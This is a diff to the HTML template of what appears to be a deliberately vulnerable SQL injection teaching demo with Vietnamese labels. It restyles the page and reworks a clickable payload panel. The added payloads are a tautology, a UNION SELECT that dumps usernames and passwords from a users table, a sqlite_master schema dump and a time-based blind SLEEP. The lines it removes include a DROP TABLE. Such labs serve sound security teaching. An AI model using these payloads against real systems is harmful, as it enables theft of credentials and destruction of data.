@@ -6,7 +6,7 @@
 <style>
     .layout {
         display: grid;
-        grid-template-columns: 280px 1fr;
+        grid-template-columns: 300px 1fr;
         gap: 16px;
     }
 
@@ -16,21 +16,29 @@
     .search-form { display: flex; gap: 6px; }
     .search-form input { flex: 1; }
 
-    .payload-list { display: flex; flex-direction: column; gap: 4px; margin-top: 6px; }
+    .payload-list { display: flex; flex-direction: column; gap: 6px; margin-top: 6px; }
     .payload-item {
         display: block;
-        padding: 6px 10px;
+        padding: 7px 10px;
         font-family: var(--mono);
         font-size: 11px;
         color: var(--text-muted);
         text-decoration: none;
-        border: 1px solid transparent;
+        border: 1px solid var(--border);
         border-radius: 2px;
         transition: border-color 0.12s, color 0.12s;
         word-break: break-all;
         line-height: 1.5;
     }
     .payload-item:hover { border-color: var(--red); color: var(--red); }
+    .payload-desc {
+        display: block;
+        font-family: var(--sans);
+        font-size: 11px;
+        color: var(--text);
+        margin-bottom: 2px;
+        font-weight: 500;
+    }
 
     /* ── Cột phải ── */
     .content-col { display: flex; flex-direction: column; gap: 12px; }
@@ -42,7 +50,7 @@
         line-height: 1.6;
     }
     .sql-console .prompt { color: var(--text-muted); user-select: none; }
-    .sql-console .query  { color: #79C0FF; }
+    .sql-console .query  { color: #79C0FF; word-break: break-word; }
     .sql-console .err    { color: var(--red); margin-top: 4px; }
 
     /* Bảng kết quả */
@@ -53,7 +61,7 @@
         font-size: 12px;
         color: var(--text-muted);
     }
-    .price { color: var(--green); font-family: var(--mono); }
+    .price { color: var(--green); font-family: var(--mono); word-break: break-word; }
     .cat-tag {
         font-family: var(--mono);
         font-size: 11px;
@@ -81,7 +89,7 @@
                 </form>
                 {% if query %}
                     <div style="margin-top:8px">
-                        <a href="{{ url_for('index') }}" class="text-muted text-sm mono">[ xóa ]</a>
+                        <a href="{{ url_for('index') }}" class="text-muted text-sm mono">[ xóa bộ lọc ]</a>
                     </div>
                 {% endif %}
             </div>
@@ -90,16 +98,28 @@
         <div class="panel">
             <div class="panel-header"><div class="dot"></div>payload / demo</div>
             <div class="panel-body">
-                <div class="text-muted text-sm mono" style="margin-bottom:8px">// thử nghiệm các vector tấn công:</div>
-                {% set p1 = "' OR 1=1 --" %}
+                <div class="text-muted text-sm mono" style="margin-bottom:8px">// bấm vào để chạy thử từng kịch bản:</div>
+                {% set p1 = "khong_co' OR 1=1 --" %}
                 {% set p2 = "' UNION SELECT id, username, password, role FROM users --" %}
-                {% set p3 = "'; DROP TABLE products; --" %}
-                {% set p4 = "' AND SLEEP(5) --" %}
+                {% set p3 = "' UNION SELECT 1, name, type, sql FROM sqlite_master WHERE type='table' --" %}
+                {% set p4 = "khong_co' OR SLEEP(2) --" %}
                 <div class="payload-list">
-                    <a class="payload-item" href="{{ url_for('index', q=p1) }}">{{ p1 }}</a>
-                    <a class="payload-item" href="{{ url_for('index', q=p2) }}">{{ p2 }}</a>
-                    <a class="payload-item" href="{{ url_for('index', q=p3) }}">{{ p3 }}</a>
-                    <a class="payload-item" href="{{ url_for('index', q=p4) }}">{{ p4 }}</a>
+                    <a class="payload-item" href="{{ url_for('index', q=p1) }}">
+                        <span class="payload-desc">1. Boolean Tautology (Lấy toàn bộ SP)</span>
+                        {{ p1 }}
+                    </a>
+                    <a class="payload-item" href="{{ url_for('index', q=p2) }}">
+                        <span class="payload-desc">2. Union Select (Rút ruột bảng users)</span>
+                        {{ p2 }}
+                    </a>
+                    <a class="payload-item" href="{{ url_for('index', q=p3) }}">
+                        <span class="payload-desc">3. Schema Dump (Dò cấu trúc bảng DB)</span>
+                        {{ p3 }}
+                    </a>
+                    <a class="payload-item" href="{{ url_for('index', q=p4) }}">
+                        <span class="payload-desc">4. Time-based Blind (Làm trễ Server 2s)</span>
+                        {{ p4 }}
+                    </a>
                 </div>
             </div>
         </div>
@@ -111,7 +131,15 @@
 
         <!-- SQL Console -->
         <div class="panel">
-            <div class="panel-header"><div class="dot"></div>query</div>
+            <div class="panel-header">
+                <div class="dot"></div>
+                query
+                {% if exec_time_ms is defined %}
+                    <span class="mono" style="margin-left:auto;color:{{ 'var(--red)' if exec_time_ms > 500 else 'var(--text-muted)' }}">
+                        {{ exec_time_ms }} ms
+                    </span>
+                {% endif %}
+            </div>
             <div class="panel-body sql-console">
                 <span class="prompt">db&gt; </span><span class="query">{{ sql_executed }}</span>
                 {% if sql_error %}
@@ -132,9 +160,9 @@
                     <thead>
                         <tr>
                             <th>ID</th>
-                            <th>Tên sản phẩm</th>
-                            <th>Danh mục</th>
-                            <th>Giá</th>
+                            <th>Tên sản phẩm / Cột 2</th>
+                            <th>Danh mục / Cột 3</th>
+                            <th>Giá / Cột 4</th>
                         </tr>
                     </thead>
                     <tbody>
